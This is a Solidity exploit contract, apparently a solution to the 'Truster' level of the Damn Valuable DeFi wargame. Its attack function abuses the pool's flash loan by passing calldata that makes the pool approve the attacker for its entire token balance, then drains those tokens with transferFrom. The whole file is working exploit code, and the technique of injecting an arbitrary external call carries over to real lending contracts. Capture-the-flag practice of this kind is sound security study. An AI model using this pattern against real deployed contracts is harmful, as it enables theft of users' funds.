// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {
    DamnValuableToken private immutable _token;
    TrusterLenderPool private immutable _pool;
    address private _player;
    constructor(DamnValuableToken token, TrusterLenderPool pool) {
        _token = token;
        _pool = pool;
        _player = msg.sender;
    }

    function attack() external {
        // executing the flash loan to exploit the external call
        // (approve spending of the token of the pool by the attacker)
        uint256 amount = _token.balanceOf(address(_pool));
        _pool.flashLoan(
            0,
            _player,
            address(_token),
            bytes(
                abi.encodeWithSignature(
                    "approve(address,uint256)",
                    address(this),
                    amount
                )
            )
        );
        
        _token.transferFrom(address(_pool), _player, amount);
    }
}
